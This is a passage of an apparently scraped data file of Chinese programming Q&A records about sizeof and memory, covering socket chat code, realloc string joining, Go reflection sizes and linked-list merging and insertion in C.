sendbuf[n]=0;\r\n                write(sockfd,sendbuf,sizeof(sendbuf));\r\n                if(strncmp(sendbuf,\".\",1)) goto KEEP_SEND;\r\n                puts(\"-------------Wait message------------\");\r\nKEEP_READ:\r\n                n=read(sockfd,recvbuf,sizeof(recvbuf));\r\n                //recvbuf[n]=0; //EOF ..\r\n                printf(\"%s\\n\",recvbuf);\r\n                if(strncmp(recvbuf,\".\",1)) goto KEEP_READ;\r\n            }\r\n            close(sockfd);\r\n        }\r\n    }   \r\n    return 0;\r\n}\r\n\r\n\r\n```\r\n\r\nPlease ,run the client as :\r\n\r\n\r\n\r\n```\r\n ./client 127.0.0.1 \r\n```\r\n\r\nif you run the both on both terminal \r\nand you see something below:\r\n\r\nterminal 1 (run server)\r\n\r\n\r\n\r\n```\r\n landpack@landpack-VirtualBox:~/ak/csdn$ ./server\r\n-----------wait message---------\r\nhello\r\n\r\nI am Landpack\r\n\r\n.\r\n\r\n-----------Please input----------\r\nHey Landpack !\r\ngood to know you\r\n.\r\n-----------wait message---------\r\n\r\n```\r\n\r\n\r\n\r\nterminal 2 (run client)\r\n```\r\n landpack@landpack-VirtualBox:~/ak/csdn$ ./client 127.0.0.1\r\n--------------Please input-----------\r\nhello\r\nI am Landpack\r\n.\r\n-------------Wait message------------\r\nHey Landpack !\r\n\r\ngood to know you\r\n\r\n.\r\n\r\n--------------Please input-----------\r\n\r\n\r\n```\r\n\r\nAll suggestion are welcome !\r\nHave fun !!", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["Linux下的类似QQ聊天程序", ["想在Linux下用socket套接字写个类似于windows下的QQ聊天程序，但是遇到不能循环发送和接受的问题，希望能向各位大侠请教，以下是代码：", "\n\n", "这是server端代码：", "\n\n", " #include<stdio.h>\n#include<string.h>\n#include<stdlib.h>\n#include<errno.h>\n#include<sys/types.h>\n#include<sys/socket.h>\n#include<netinet/in.h>\n\nint main()\n{\n        int oldfd,newfd;\n        struct sockaddr_in mysock;\n        int n;\n        char buf[1024];\n\n        oldfd=socket(AF_INET,SOCK_STREAM,0);\n        memset(&mysock,0,sizeof(mysock));\n        mysock.sin_family=AF_INET;\n        mysock.sin_port=htons(1025);\n        mysock.sin_addr.s_addr=htonl(INADDR_ANY);\n\n        bind(oldfd,(struct sockaddr*)&mysock,sizeof(mysock));\n        listen(oldfd,13);\n        while(1)\n        {\n                newfd=accept(oldfd,(struct sockaddr*)NULL,NULL);\n                //read();\n                n=read(newfd,buf,sizeof(buf));\n                buf[n]=0;\n                printf(\"%s\\n\",buf);\n                write(newfd,buf,n);//再写到client上去\n                close(newfd);\n            }\n        close(oldfd);\n        return 0;\n    }\n\n\n", "\n\n", "以下是client端的代码：", "\n\n", " #include<stdio.h>\n#include<string.h>\n#include<stdlib.h>\n#include<errno.h>\n#include<sys/types.h>\n#include<sys/socket.h>\n#include<netinet/in.h>\n#include<unistd.h>\n\nint main(int argc,char **argv)\n{\n    int fd;\n    int n;\n    struct sockaddr_in mysock;\n    char buf[1024];\n\n    fd=socket(AF_INET,SOCK_STREAM,0);\n    memset(&mysock,0,sizeof(mysock));\n    mysock.sin_family=AF_INET;\n    mysock.sin_port=htons(1025);\n    inet_pton(AF_INET,argv[1],&mysock.sin_addr.s_addr);\n    while(1){//这是在一次连接成功后添加的循环\n        connect(fd,(struct sockaddr*)&mysock,sizeof(mysock));\n        n=read(STDIN_FILENO,buf,sizeof(buf));\n        write(fd,buf,n);\n\n        read(fd,buf,sizeof(buf));\n        buf[n]=0;\n        printf(\"this is fankui information:%s\\n\",buf);\n\n    }\n    close(fd);\n    return 0;\n    }\n\n\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;char *pp &amp;#61; (char &lt;em&gt;)realloc(p,sizeof(char)&lt;/em&gt;(len&amp;#43;len1));&lt;br /&gt;字符串全部填满了&amp;#xff0c;应该留一个结尾字符\\n&lt;br /&gt;故而应该是&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-c\"&gt;&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;void&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;connectStr&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(&lt;span class=\"hljs-type\"&gt;char&lt;/span&gt; *str1,&lt;span class=\"hljs-type\"&gt;char&lt;/span&gt; *str2)&lt;/span&gt;&lt;/span&gt;{\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; len &amp;#61; &lt;span class=\"hljs-built_in\"&gt;strlen&lt;/span&gt;(str1);\n    &lt;span class=\"hljs-type\"&gt;char&lt;/span&gt; *p &amp;#61; (&lt;span class=\"hljs-type\"&gt;char&lt;/span&gt; *)&lt;span class=\"hljs-built_in\"&gt;malloc&lt;/span&gt;(&lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-type\"&gt;char&lt;/span&gt;) * len);\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt;(&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; i&amp;#61;&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;i&amp;lt;len;i&amp;#43;&amp;#43;){\n        p[i] &amp;#61; str1[i];\n    }\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; len1 &amp;#61; &lt;span class=\"hljs-built_in\"&gt;strlen&lt;/span&gt;(str2);\n    &lt;span class=\"hljs-type\"&gt;char&lt;/span&gt; *pp &amp;#61; (&lt;span class=\"hljs-type\"&gt;char&lt;/span&gt; *)&lt;span class=\"hljs-built_in\"&gt;realloc&lt;/span&gt;(p,&lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-type\"&gt;char&lt;/span&gt;)*(len&amp;#43;len1 &amp;#43; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;));    \n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; index &amp;#61; len;\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt;(&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; i&amp;#61;&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;i&amp;lt;len1;i&amp;#43;&amp;#43;){\n        pp[index&amp;#43;&amp;#43;] &amp;#61; str2[i];\n    }\npp[index] &amp;#61; &lt;span class=\"hljs-string\"&gt;&amp;#39;\\0&amp;#39;&lt;/span&gt;;\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;%s&amp;#34;&lt;/span&gt;,pp);\n}\n \n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;main&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;()&lt;/span&gt;&lt;/span&gt;{\n    &lt;span class=\"hljs-type\"&gt;char&lt;/span&gt; *str1 &amp;#61; &lt;span class=\"hljs-string\"&gt;&amp;#34;123&amp;#34;&lt;/span&gt;;\n    &lt;span class=\"hljs-type\"&gt;char&lt;/span&gt; *str2 &amp;#61; &lt;span class=\"hljs-string\"&gt;&amp;#34;abc&amp;#34;&lt;/span&gt;;\n    &lt;span class=\"hljs-built_in\"&gt;connectStr&lt;/span&gt;(str1,str2);\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n}\n\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C使用malloc和realloc拼接字符串问题", ["\n  ", "void", " ", "connectStr", "(", "char", " *str1,", "char", " *str2)", "{\n    ", "int", " len = ", "strlen", "(str1);\n    ", "char", " *p = (", "char", " *)", "malloc", "(", "sizeof", "(", "char", ") * len);\n    ", "for", "(", "int", " i=", "0", ";i<len;i++){\n        p[i] = str1[i];\n    }\n    ", "int", " len1 = ", "strlen", "(str2);\n    ", "char", " *pp = (", "char", " *)", "realloc", "(p,", "sizeof", "(", "char", ")*(len+len1));    \n    ", "int", " index = len;\n    ", "for", "(", "int", " i=", "0", ";i<len1;i++){\n        pp[index++] = str2[i];\n    }\n    ", "printf", "(", "\"%s\"", ",pp);\n}\n\n", "int", " ", "main", "()", "{\n    ", "char", " *str1 = ", "\"123\"", ";\n    ", "char", " *str2 = ", "\"abc\"", ";\n    ", "connectStr", "(str1,str2);\n    ", "return", " ", "0", ";\n}\n", "\n", "为啥输出的是123abc和一个随机的字符？"]], "Tag": "程序设计"}
{"Answer": "&lt;div class=\"post-text\" itemprop=\"text\"&gt;\r\n&lt;p&gt;There is no \"reference\" type in go, a pointer is a value like any other, and you can of course get the size of the pointer itself. You also are confusing the &lt;code&gt;reflect.Value&lt;/code&gt;, the &lt;code&gt;interface{}&lt;/code&gt; and the actual value you want the size of. Contributing to this confusion is that the package &lt;code&gt;unsafe&lt;/code&gt; is special, and doesn't take an interface value, rather it can take any value directly, which is properly handled by the compiler.&lt;/p&gt;\n\n&lt;p&gt;You could handle the pointer and the struct each with a separate call, or check whether you have a pointer and call &lt;code&gt;Elem()&lt;/code&gt;:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;// struct\nreflect.ValueOf(i).Type().Size()\n// pointer\nreflect.ValueOf(i).Elem().Type().Size()\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;However, since optionally dereferencing a pointer is quite common, you can use &lt;code&gt;reflect.Indirect&lt;/code&gt; to handle both types at once:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;reflect.Indirect(reflect.ValueOf(i)).Type().Size()\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;&lt;a href=\"https://play.golang.org/p/og-uMDXCmEr\" rel=\"nofollow noreferrer\"&gt;https://play.golang.org/p/og-uMDXCmEr&lt;/a&gt;&lt;/p&gt;\n\n&lt;p&gt;For reference, a description of what some the attempts are actually taking:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;// size of the interface value\nunsafe.Sizeof(valueObject)\n\n// size of reflect.Value\nunsafe.Sizeof(reflect.ValueOf(valueObject))\n\n// size of the reflect.Value type \nreflect.TypeOf(reflect.ValueOf(valueObject)).Size()\n\n// size of the interface value\nunsafe.Sizeof(referenceObject)\n\n// size of the reflect.Value\nunsafe.Sizeof(reflect.ValueOf(referenceObject))\n\n// size of the pointer value\nreflect.TypeOf(referenceObject).Size()\n\n// size of the reflect.Value type\nreflect.TypeOf(reflect.ValueOf(referenceObject)).Size(),\n\n// size of the of reflect.Value type again\nreflect.TypeOf(reflect.ValueOf(referenceObject).Elem()).Size()\n\n// size of the reflect.Value\nunsafe.Sizeof(reflect.ValueOf(referenceObject).Elem()),\n\n// size of the reflect.Type interface value\nunsafe.Sizeof(reflect.TypeOf(reflect.ValueOf(referenceObject).Elem())),\n&lt;/code&gt;&lt;/pre&gt;\n    &lt;/div&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["从指针接口获取结构的大小", ["\n\n", "I am attempting to generically get the size of any struct from an interface. This works fine with objects that are passed by value, but I can't figure out how to get the size of the object when it's passed the reference using an interface.", "\n\n", "Here's an example indicating the problem I'm having:\n", "https://play.golang.org/p/QXXZm-j7_hZ", "\n\n", "package main\n\nimport (\n    \"fmt\"\n    \"reflect\"\n    \"unsafe\"\n)\n\ntype T struct {\n    c [50]byte\n}\n\nfunc main() {\n    fmt.Println(\"Hello, playground\")\n\n    var t T\n    s := unsafe.Sizeof(t)\n    fmt.Println(\"expected size\", s)\n    getSize(t, &t)\n}\n\nfunc getSize(valueObject interface{}, referenceObject interface{}) {\n    vs := []uintptr{\n        unsafe.Sizeof(valueObject),\n        unsafe.Sizeof(reflect.ValueOf(valueObject)),\n        reflect.TypeOf(valueObject).Size(), // THIS WORKS FOR VALUE\n        reflect.TypeOf(reflect.ValueOf(valueObject)).Size(),\n        0, //reflect.TypeOf(reflect.ValueOf(valueObject).Elem()).Size(), //EXCEPTION ACCESSING ELEM WITH VALUE\n        0, //reflect.TypeOf(reflect.ValueOf(valueObject).Elem()).Size(), //EXCEPTION ACCESSING ELEM WITH VALUE\n        0, //unsafe.Sizeof(reflect.ValueOf(valueObject).Elem()), //EXCEPTION ACCESSING ELEM WITH VALUE\n        0, //unsafe.Sizeof(reflect.TypeOf(reflect.ValueOf(valueObject).Elem())), //EXCEPTION ACCESSING ELEM WITH VALUE\n    }\n    fmt.Println(\"valueObject size\", vs)\n\n    rs := []uintptr{\n        unsafe.Sizeof(referenceObject),\n        unsafe.Sizeof(reflect.ValueOf(referenceObject)),\n        reflect.TypeOf(referenceObject).Size(),\n        reflect.TypeOf(reflect.ValueOf(referenceObject)).Size(),\n        reflect.TypeOf(reflect.ValueOf(referenceObject).Elem()).Size(),\n        reflect.TypeOf(reflect.ValueOf(referenceObject).Elem()).Size(),\n        unsafe.Sizeof(reflect.ValueOf(referenceObject).Elem()),\n        unsafe.Sizeof(reflect.TypeOf(reflect.ValueOf(referenceObject).Elem())),\n    }\n\n    fmt.Println(\"referenceObject size\", rs)\n}\n", "\n\n", "This is the output:", "\n\n", "expected size 50\nvalueObject size [8 12 50 12 0 0 0 0]\nreferenceObject size [8 12 4 12 12 12 12 8]\n", "\n\n", "As you can see, I can get the size of the object when it's passed-by-value using ", "reflect.TypeOf(valueObject).Size()", ", but nothing gives me the correct size when I pass-by-reference.", "\n    "]], "Tag": "程序设计"}
{"Answer": "```\r\n#include&lt;stdio.h&gt;\r\n#include&lt;string.h&gt;\r\nint main(){\r\n\tchar str[]=\"to be or not to be\";\r\n\tprintf(\"the string:\\n%s\\n\",str);\r\n\tprintf(\"contains %d characters and %d bites\",strlen(str),sizeof(str));\r\n\treturn 0;\r\n}\r\n \r\n```\r\n效果![图片说明](https://img-ask.csdn.net/upload/201611/06/1478421417_589145.png)\r\n不建议将太多的东西放在一起，可以适当的分开，增强可读性。\r\n而且你的strlen用的不是很对", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["编译显示成功，但生成时显示Project1.exe已停止工作", ["#define ", "STDC_WANT_LIB_EXT1", " 1", "\n#include", "\n#include", "\nint main()", "\n{", "\n    char str1 = \"to or not to be.\";", "\n    printf(\"the string:\\n   \\\"%s\\\"\\ncontains %zu characters and %zu bites.\",str1,strnlen_s(str1,sizeof(str1)), sizeof(str1));", "\n\n", "return 0;\n", "\n\n", "}"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;遍历链表&amp;#xff0c;在遍历的时候比较&amp;#xff0c;小的先插入新链表就可以了&amp;#xff0c;你的hb代码看着没有问题&amp;#xff0c;那么就是在创建链表的时候&amp;#xff0c;根据随机生成的数插入链表中&amp;#xff0c;使之非递减。&lt;br /&gt;代码及运行结果如下&amp;#xff1a;&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;p class=\"md_img_container\"&gt;&lt;img align=\"left\" alt=\"img\" src=\"https://img-mid.csdnimg.cn/release/static/image/mid/ask/793141056156193.png\" class=\"md_img\" /&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;代码&amp;#xff1a;&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;\n#include &amp;lt;stdio.h&amp;gt;\n#include &amp;lt;stdlib.h&amp;gt;\n#include &amp;lt;&lt;span class=\"hljs-built_in\"&gt;time&lt;/span&gt;.h&amp;gt;\n\ntypedef struct lnode\n{\n    int &lt;span class=\"hljs-keyword\"&gt;data&lt;/span&gt;;\n    struct lnode* next;\n}Lnode;\n\n\nLnode* inserNode(Lnode* head, Lnode* p)\n{\n    Lnode* pre,*t;\n    pre &amp;#61; head;\n    &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;t&lt;/span&gt; &amp;#61; pre-&amp;gt;&lt;/span&gt;next;\n    &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt; (t)\n    {\n        &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;if&lt;/span&gt; (t-&amp;gt;&lt;/span&gt;&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;data&lt;/span&gt; &amp;gt;&amp;#61; p-&amp;gt;&lt;/span&gt;&lt;span class=\"hljs-keyword\"&gt;data&lt;/span&gt;)\n            break;\n        &lt;span class=\"hljs-keyword\"&gt;else&lt;/span&gt;\n        {\n            pre &amp;#61; t;\n            &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;t&lt;/span&gt; &amp;#61; t-&amp;gt;&lt;/span&gt;next;\n        }\n\n    }\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (t &amp;#61;&amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;)\n    {\n        &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;pre&lt;/span&gt;-&amp;gt;&lt;/span&gt;next &amp;#61; p;\n    }\n    &lt;span class=\"hljs-keyword\"&gt;else&lt;/span&gt;\n    {\n        &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;pre&lt;/span&gt;-&amp;gt;&lt;/span&gt;next &amp;#61; p;\n        &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;p&lt;/span&gt;-&amp;gt;&lt;/span&gt;next &amp;#61; t;\n    }\n    return head;\n}\n\n\nLnode* CreateList(int n)\n{\n    int i;\n    Lnode* head &amp;#61; (Lnode*)malloc(sizeof(Lnode));\n    Lnode* t;\n    &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;head&lt;/span&gt;-&amp;gt;&lt;/span&gt;next &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n    \n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; i &amp;lt; n; i&amp;#43;&amp;#43;)\n    {\n        t &amp;#61; (Lnode*)malloc(sizeof(Lnode));\n        &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;t&lt;/span&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"hljs-keyword\"&gt;data&lt;/span&gt; &amp;#61; rand()%&lt;span class=\"hljs-number\"&gt;100&lt;/span&gt;; &lt;span class=\"hljs-comment\"&gt;//生成0~99的整数&lt;/span&gt;\n        &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;t&lt;/span&gt;-&amp;gt;&lt;/span&gt;next &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n        head &amp;#61; inserNode(head, t);\n    }\n    return head;\n}\n\n\nLnode* hb(Lnode* pa, Lnode* pb)\n{\n    Lnode* p, * q, * pc;\n    &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;pb&lt;/span&gt; &amp;#61; pb-&amp;gt;&lt;/span&gt;next;\n    &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;pa&lt;/span&gt; &amp;#61; pa-&amp;gt;&lt;/span&gt;next;\n    pc &amp;#61; (Lnode*)malloc(sizeof(Lnode));\n    p &amp;#61; pc;\n    &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt; (pa &amp;amp;&amp;amp; pb)\n    {\n        q &amp;#61; (Lnode*)malloc(sizeof(Lnode));\n        &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;if&lt;/span&gt; (pb-&amp;gt;&lt;/span&gt;&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;data&lt;/span&gt; &amp;lt; pa-&amp;gt;&lt;/span&gt;&lt;span class=\"hljs-keyword\"&gt;data&lt;/span&gt;)\n        {\n            &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;q&lt;/span&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;data&lt;/span&gt; &amp;#61; pb-&amp;gt;&lt;/span&gt;&lt;span class=\"hljs-keyword\"&gt;data&lt;/span&gt;;\n            &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;pb&lt;/span&gt; &amp;#61; pb-&amp;gt;&lt;/span&gt;next;\n        }\n        &lt;span class=\"hljs-keyword\"&gt;else&lt;/span&gt;\n        {\n            &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;q&lt;/span&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;data&lt;/span&gt; &amp;#61; pa-&amp;gt;&lt;/span&gt;&lt;span class=\"hljs-keyword\"&gt;data&lt;/span&gt;;\n            &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;pa&lt;/span&gt; &amp;#61; pa-&amp;gt;&lt;/span&gt;next;\n        }\n        &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;p&lt;/span&gt;-&amp;gt;&lt;/span&gt;next &amp;#61; q;\n        p &amp;#61; q;\n    }\n    &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt; (pa)\n    {\n        q &amp;#61; (Lnode*)malloc(sizeof(Lnode));\n        &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;q&lt;/span&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;data&lt;/span&gt; &amp;#61; pa-&amp;gt;&lt;/span&gt;&lt;span class=\"hljs-keyword\"&gt;data&lt;/span&gt;;\n        &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;pa&lt;/span&gt; &amp;#61; pa-&amp;gt;&lt;/span&gt;next;\n        &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;p&lt;/span&gt;-&amp;gt;&lt;/span&gt;next &amp;#61; q;\n        p &amp;#61; q;\n    }\n    &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt; (pb)\n    {\n        q &amp;#61; (Lnode*)malloc(sizeof(Lnode));\n        &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;q&lt;/span&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;data&lt;/span&gt; &amp;#61; pb-&amp;gt;&lt;/span&gt;&lt;span class=\"hljs-keyword\"&gt;data&lt;/span&gt;;\n        &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;pb&lt;/span&gt; &amp;#61; pb-&amp;gt;&lt;/span&gt;next;\n        &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;p&lt;/span&gt;-&amp;gt;&lt;/span&gt;next &amp;#61; q;\n        p &amp;#61; q;\n    }\n    &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;p&lt;/span&gt;-&amp;gt;&lt;/span&gt;next &amp;#61; NULL;\n    return(pc);\n}\n\n\n&lt;span class=\"hljs-comment\"&gt;//显示&lt;/span&gt;\nvoid printList(Lnode* head)\n{\n    Lnode* p;\n    &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;if&lt;/span&gt; (head &amp;#61;&amp;#61; 0 || head-&amp;gt;&lt;/span&gt;next &amp;#61;&amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;)\n    {\n        printf(&lt;span class=\"hljs-string\"&gt;&amp;#34;链表为空\\n&amp;#34;&lt;/span&gt;);\n        return;\n    }\n    &lt;span class=\"hljs-keyword\"&gt;else&lt;/span&gt;\n    {\n        &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;p&lt;/span&gt; &amp;#61; head-&amp;gt;&lt;/span&gt;next;\n        &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt; (p)\n        {\n            &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;printf&lt;/span&gt;(&amp;#34;%d &amp;#34;, p-&amp;gt;&lt;/span&gt;&lt;span class=\"hljs-keyword\"&gt;data&lt;/span&gt;);\n            &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-title\"&gt;p&lt;/span&gt; &amp;#61; p-&amp;gt;&lt;/span&gt;next;\n        }\n        printf(&lt;span class=\"hljs-string\"&gt;&amp;#34;\\n&amp;#34;&lt;/span&gt;);\n    }\n}\n\nint main()\n{\n    int m, n;\n    Lnode* la&amp;#61;&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;, *lb&amp;#61;&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;,*lc&amp;#61;&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n    srand((unsigned int)&lt;span class=\"hljs-built_in\"&gt;time&lt;/span&gt;(NULL));\n    printf(&lt;span class=\"hljs-string\"&gt;&amp;#34;请数量链表A和链表B的长度&amp;#xff1a;&amp;#34;&lt;/span&gt;);\n    scanf(&lt;span class=\"hljs-string\"&gt;&amp;#34;%d %d&amp;#34;&lt;/span&gt;, &amp;amp;m, &amp;amp;n);\n    la &amp;#61; CreateList(m);\n    printf(&lt;span class=\"hljs-string\"&gt;&amp;#34;链表A&amp;#xff1a;&amp;#34;&lt;/span&gt;);\n    printList(la);\n    lb &amp;#61; CreateList(n);\n    printf(&lt;span class=\"hljs-string\"&gt;&amp;#34;链表B&amp;#xff1a;&amp;#34;&lt;/span&gt;);\n    printList(lb);\n    lc &amp;#61; hb(la, lb);\n    printf(&lt;span class=\"hljs-string\"&gt;&amp;#34;合并后的链表为&amp;#xff1a;&amp;#34;&lt;/span&gt;);\n    printList(lc);\n    return &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n}\n\n\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["完善数据结构代码，解惑", ["设计一个程序，生成两个按值非递减有序排列的线性表LA和LB，再将LA和LB归并为一个新的线性表LC，且LC中的数据仍按值非递减有序排列，输出线性表LA、LB、LC。", "用单链表来实现，以下是部分归并函数，总函数想要实现分别输入两个线性表内元素的个数，然后用rand以及srand函数赋随机值，再实现归并，有专家完善一下吗", "\n", "Lnode *hb(Lnode *pa,Lnode*pb)\n{\n    Lnode *p,*q,*pc;\n    ", "pb", "=pb->", "next;\n    ", "pa", "=pa->", "next;\n    pc=(Lnode*)malloc(sizeof(Lnode));\n    p=pc; \n", "while", "(pa&&pb)\n{\n    q=(Lnode*)malloc(sizeof(Lnode));\n    ", "if", "(pb->", "data", "<pa->", "data", ")\n    {\n        ", "q", "->", "data", "=pb->", "data", ";\n        ", "pb", "=pb->", "next;\n    }\n    ", "else", "\n    {\n        ", "q", "->", "data", "=pa->", "data", ";\n        ", "pa", "=pa->", "next; \n    }\n    ", "p", "->", "next=q;\n    p=q;\n}\n", "while", "(pa)\n{\n    q=(Lnode*)malloc(sizeof(Lnode));\n    ", "q", "->", "data", "=pa->", "data", ";\n    ", "pa", "=pa->", "next;\n    ", "p", "->", "next=q;\n    p=q;\n}\n", "while", "(pb)\n{\n    q=(Lnode *)malloc(sizeof(Lnode));\n    ", "q", "->", "data", "=pb->", "data", ";\n    ", "pb", "=pb->", "next;\n    ", "p", "->", "next=q;\n    p=q;\n}\n", "p", "->", "next=NULL;\nretuen(pc);\n}\n\n", "\n", "```"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;insertNodeByHead(List, 3);&lt;br /&gt;改为&lt;br /&gt;List &amp;#61; insertNodeByHead(List, 3);&lt;br /&gt;&amp;#61;&amp;#61;&amp;#61;&amp;#61;&amp;#61;&amp;#61;&amp;#61;&amp;#61;&amp;#61;&amp;#61;&amp;#61;&amp;#61;&amp;#61;&amp;#61;&amp;#61;&amp;#61;&amp;#61;&amp;#61;&amp;#61;&lt;br /&gt;因为这个函数参数只是struct Node* headNode&amp;#xff0c;传入时指针是空的&amp;#xff0c;在函数内部是不能实现给外部传入的空指针分配空间的&amp;#xff0c;除非你用指针的指针。或者将指针作为返回值。其实你的函数已经将指针作为返回值了&amp;#xff0c;所以你只需要将返回值赋值给List就可以了。否则List还是个没有初始化的指针&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["ListNode链表插入节点函数：指针参数传入及回传问题", ["在研究链表节点插入的时候发现的问题。先看节点插入函数：", "\n", "\n", "//插入节点，参数：插入那个链表，插入节点的数据是多少", "\nstruct Node* insertNodeByHead(struct Node* headNode, int ", "data", "){\n    struct Node* newNode = createNode(", "data", ");\n    ", "if", "(headNode==NULL){\n        headNode = (struct Node*)malloc(sizeof(struct Node));\n        ", "headNode", "->", "data", " = ", "9", ";\n        ", "headNode", "->", "next = NULL;\n    }\n    ", "newNode", "->", "next", " = headNode->", "next; ", "//此时两个节点共同指向下一个节点 ", "\n    ", "headNode", "->", "next = newNode;       ", "//现在headNode节点指向newNode节点", "\n    return headNode; \n} \n", "\n", "我学习的教程是没有判断改链表是否为空的情况，我考虑到如果链表是空的话，那我先给链表分配内存。但是问题出现：", "\n", "\n", "struct", " ", "Node", "* ", "createList", "(){\n    ", "struct", " ", "Node", "* headNode = (", "struct", " ", "Node", "*)", "malloc", "(", "sizeof", "(", "struct", " Node));\n    ", "//headNode成为了结构体变量 ", "\n    ", "//变量使用前必须初始化 ", "\n    ", "//headNode->data = 1; ", "\n    headNode->next = ", "NULL", ";\n    ", "return", " headNode;\n}\n\nint ", "main", "(){\n    ", "struct", " ", "Node", "* List;                        ", "//创建一个链表变量    未初始化 ", "\n    ", "struct", " ", "Node", "* list = ", "createList", "();              ", "//创建一个链表，已分配内存    